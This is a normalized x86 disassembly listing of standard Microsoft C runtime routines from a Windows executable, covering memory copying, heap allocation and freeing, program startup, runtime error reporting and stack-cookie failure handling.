mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_424e6c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424cd0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424cd0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_424cd0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424e6c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424e6c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_424e6c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_424ec1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
call sub_426840
push 0x1e
call sub_426691
push 0xff
call sub_42632e
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
pop ebp
retn
inc eax
sub_424f00
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_426a24
pop ecx
call sub_4268f3
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_426840
push 0x1e
call sub_426691
push 0xff
call sub_42632e
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_4268f3
mov [ eax ] esi
push ebx
call sub_426a24
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_4268f3
mov [ eax ] esi
sub_424fd2
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov esi ecx
mov [ ebp - 0x4 ] r--data
call sub_425270
mov [ esi ] r--data
mov eax esi
pop esi
leave
retn
sub_424ff8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_424f00
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_426a24
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_425400
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_426f77
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_425270
push sub_44e6f3
mov [ rw-data ] esi
call sub_42606a
pop ecx
sub_4250e8
push 0x58
push r--data
call sub_4278c0
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_426879
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_426dfc
test eax eax
jne r-xdata
push 0x1c
call sub_425078
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_427871
mov [ ebp - 0x4 ] esi
call sub_4275d9
test eax eax
jns r-xdata
push 0x10
call sub_425078
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_427542
mov [ rw-data ] eax
call sub_427487
test eax eax
jns r-xdata
push 0x1b
call sub_42664d
call sub_427202
test eax eax
jns r-xdata
push 0x8
call sub_42664d
push 0x1
call sub_42642c
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_42664d
call sub_4271a3
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_42664d
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_42662f
jmp sub_425245
push eax
call sub_426603
push ecx
push eax
push esi
push __dos_header
call sub_402912
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
sub_42529a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_427be0
lea esi [ eax + 0x1 ]
push esi
call sub_424f00
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_427b7a
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_4252f8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_42529a
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42531f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_4252da
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_42529a
jmp r-xdata
sub_42535f
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_425388
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_4252f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4253d9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4252da
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_425400
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_42531f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_425425
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4252da
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_425469
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4252da
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4254ad
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4252da
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_425515
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425505
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_425554
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_427fd0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_425574
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_427fd0
neg eax
pop ecx
sbb eax eax
pop ecx
neg eax
pop ebp
retn 0x4
sub_425595
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_427fd0
pop ecx
pop ecx
xor ecx ecx
test eax eax
setg cl
mov eax ecx
pop ebp
retn 0x4
sub_4255d8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_428fc0
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_4280f4
pop ecx
pop ecx
test eax eax
jle r-xdata
push esi
push edi
call sub_428fc0
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_42815a
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
test eax eax
jns r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
cmp eax 0x2
jle r-xdata
fld [ ebp + 0x8 ]
mov edx 0x7fffffff
sub edx eax
cmp ecx edx
jg r-xdata
mov edx 0x80000000
sub edx eax
cmp ecx edx
jl r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x3
jne r-xdata
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_42821d
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
push ecx
push ecx
add eax ecx
cmp eax 0xa00
jle r-xdata
fmul [ r--data ]
jmp r-xdata
fild [ ebp + 0x10 ]
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
call sub_428d9a
add esp 0x18
jmp r-xdata
call sub_428ec5
add esp 0x24
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_428058
add esp 0xc
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
jmp r-xdata
push eax
push ecx
push ecx
fstp [ esp ]
call sub_428058
push esi
fstp [ ebp + 0x8 ]
push edi
call sub_428fc0
add esp 0x14
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_428058
add esp 0xc
jmp r-xdata
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_42578a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_4268f3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4268b1
pop ecx
mov [ esi ] eax
pop esi
sub_4257d0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_4258a3
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4296a0
sub_4258c4
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429874
add esp 0x14
pop ebp
retn
sub_4258e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x658
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x654 ] eax
mov eax [ ebp + 0xc ]
push edi
push 0x3
mov [ ebp - 0x64c ] eax
call sub_42ac24
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
xor edi edi
mov esi rw-data
cmp ebx 0xffffffff
je r-xdata
push 0x3
call sub_42ac24
pop ecx
test eax eax
jne r-xdata
call sub_429e89
test [ eax + 0x4c ] 0x10c
jne r-xdata
cmp ebx edi
je r-xdata
push r--data
mov esi 0x21c
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42abc1
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x64c ]
push [ ebp - 0x654 ]
push esi
call sub_429e89
add eax 0x40
push eax
call sub_429c7d
call sub_429e89
add eax 0x40
push eax
call sub_429c21
add esp 0x18
push edi
push 0x4
push edi
call sub_429e89
add eax 0x40
push eax
call sub_429d93
add esp 0x10
push [ ebp + 0x10 ]
lea eax [ ebp - 0x43c ]
push [ ebp - 0x64c ]
push [ ebp - 0x654 ]
push esi
push 0x21c
push eax
call sub_4258c4
add esp 0x18
test eax eax
js r-xdata
xor edi edi
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push ebx
call [ GetFileType@IAT ]
cmp eax 0x2
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_4296a0
push r--data
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
xor edi edi
test eax eax
jne r-xdata
push edi
lea eax [ ebp - 0x658 ]
push eax
lea eax [ ebp - 0x43c ]
push eax
call sub_42ab31
pop ecx
push eax
lea eax [ ebp - 0x43c ]
push eax
push ebx
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
push ebx
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
mov eax ebx
push eax
call sub_42ab31
lea ebx [ ebp + eax * 2 - 0x6aa ]
lea ecx [ ebp - 0x648 ]
mov eax ebx
sub eax ecx
push 0x3
push [ rw-data ]
sar eax 0x1
mov ecx 0x105
sub ecx eax
push ecx
push ebx
call sub_42aa64
add esp 0x14
test eax eax
jne r-xdata
mov [ ebp - 0x440 ] ax
push 0x104
lea eax [ ebp - 0x648 ]
push eax
push edi
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
call sub_42a03e
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
lea ebx [ ebp - 0x648 ]
mov eax ebx
push eax
call sub_42ab31
add eax 0xb
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
lea eax [ ebp - 0x648 ]
push 0x105
push eax
call sub_42abc1
add esp 0xc
test eax eax
je r-xdata
push r--data
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push [ ebp - 0x64c ]
call sub_42ab31
add eax 0x8
pop ecx
push [ ebp - 0x64c ]
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
call sub_42ab31
mov edx [ ebp - 0x64c ]
mov ebx eax
movzx eax [ edx + ebx * 2 - 0x2 ]
pop ecx
mov [ ebp - 0x650 ] 0x1
cmp eax 0x5c
je r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
mov eax ebx
sub eax [ ebp - 0x650 ]
mov [ ebp - 0x658 ] eax
cmp eax 0x23
jbe r-xdata
mov ecx eax
lea eax [ edx + ebx * 2 - 0x2 ]
push r--data
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
jae r-xdata
cmp [ ebp - 0x650 ] 0x11
jae r-xdata
cmp [ ebp - 0x650 ] ebx
jae r-xdata
lea eax [ ebp - 0x43c ]
push 0xa
push eax
call sub_42ab31
pop ecx
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0x43c ]
push eax
call sub_42ab31
pop ecx
lea eax [ ebp + eax * 2 - 0x43c ]
push eax
push [ ebp + 0x10 ]
call sub_42a7d0
add esp 0x10
test eax eax
jne r-xdata
push 0x20
push [ ebp - 0x64c ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42a98e
add esp 0x10
test eax eax
jne r-xdata
shr [ ebp - 0x650 ] 0x1
push 0x31
pop eax
sub eax [ ebp - 0x650 ]
push eax
push [ ebp - 0x64c ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42a98e
add esp 0x10
test eax eax
jne r-xdata
cmp eax 0x23
push 0x31
pop eax
sub eax [ ebp - 0x650 ]
push eax
push [ ebp - 0x64c ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42a98e
add esp 0x10
test eax eax
jne r-xdata
inc [ ebp - 0x650 ]
sub eax 0x2
movzx edx [ eax ]
mov ecx edx
cmp edx 0x5c
jne r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
cmp cx 0x2f
je r-xdata
push r--data
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x658 ]
mov eax [ ebp - 0x64c ]
push 0x7
lea eax [ eax + ecx * 2 ]
push eax
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42a98e
add esp 0x10
test eax eax
jne r-xdata
sub ebx [ ebp - 0x650 ]
mov eax [ ebp - 0x64c ]
lea eax [ eax + ebx * 2 ]
jmp r-xdata
mov eax [ ebp - 0x64c ]
mov ecx [ ebp - 0x658 ]
lea eax [ eax + ecx * 2 ]
push [ ebp - 0x654 ]
call sub_42ab31
mov ebx eax
lea eax [ ebp - 0x43c ]
push eax
call sub_42ab31
lea eax [ ebx + eax + 0xb0 ]
pop ecx
cmp eax esi
pop ecx
lea eax [ ebp - 0x43c ]
jbe r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push eax
push [ ebp - 0x654 ]
jmp r-xdata
push eax
call sub_42ab31
mov ecx 0x169
sub ecx eax
push ecx
push [ ebp - 0x654 ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42a98e
add esp 0x14
test eax eax
jne r-xdata
mov eax [ ebp - 0x64c ]
lea eax [ eax + ebx * 2 - 0xe ]
jmp r-xdata
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push [ rw-data ]
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x43c ]
push esi
push eax
call sub_42ab4c
add esp 0xc
test eax eax
jne r-xdata
push 0x12012
lea eax [ ebp - 0x43c ]
push r--data
push eax
call sub_42a585
add esp 0xc
cmp eax 0x3
jne r-xdata
cmp eax 0x4
jne r-xdata
push 0x16
call sub_42a3e2
pop ecx
push 0x3
call sub_426619
cmp eax 0x5
jne r-xdata
int3
call sub_42a03e
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_425f47
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_42adde
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_42ad3e
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_42ad3e
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_425ffd
mov edi edi
push esi
push 0x4
push 0x20
call sub_42acf2
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_42602e
push 0xc
push r--data
call sub_4278c0
call sub_426346
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_425f47
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426064
mov eax [ ebp - 0x1c ]
call sub_427905
retn
sub_4260b6
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax esi
pop esi
pop ebp
retn
sub_4260ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_42afcc
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_42afcc
pop ecx
sub_426303
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_426358
mov edi edi
push esi
call sub_426a4c
mov esi eax
push esi
call sub_4269c8
push esi
call sub_429534
push esi
call sub_42afbd
push esi
call sub_42b22e
push esi
call sub_42a092
push esi
call sub_42b21d
add esp 0x18
